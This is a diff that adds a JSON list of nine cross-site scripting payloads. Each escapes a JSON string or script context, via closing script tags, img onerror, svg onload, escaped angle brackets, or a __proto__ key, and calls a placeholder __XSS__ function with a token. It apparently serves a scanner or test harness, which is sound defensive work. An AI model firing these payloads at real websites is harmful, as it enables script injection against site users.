@@ -1,0 +1,11 @@
+[
+  "\",\"x\":\"</script><script>__XSS__('{{TOKEN}}')</script>",
+  "\",\"x\":\"<img src=x onerror=__XSS__('{{TOKEN}}')>",
+  "\",\"x\":\"\\u003cscript\\u003e__XSS__('{{TOKEN}}')\\u003c/script\\u003e",
+  "\",\"x\":\"\\x3cscript\\x3e__XSS__('{{TOKEN}}')\\x3c/script\\x3e",
+  "\",\"x\":\"</script><svg onload=__XSS__('{{TOKEN}}')>",
+  "\",\"x\":\"\\u003cimg src=x onerror=__XSS__('{{TOKEN}}')\\u003e",
+  "\",\"__proto__\":{\"x\":\"<svg/onload=__XSS__('{{TOKEN}}')>\"}",
+  "\"],\"x\":\"<img src=x onerror=__XSS__('{{TOKEN}}')>\",\"y\":[\"",
+  "\"}});__XSS__('{{TOKEN}}');//"
+]
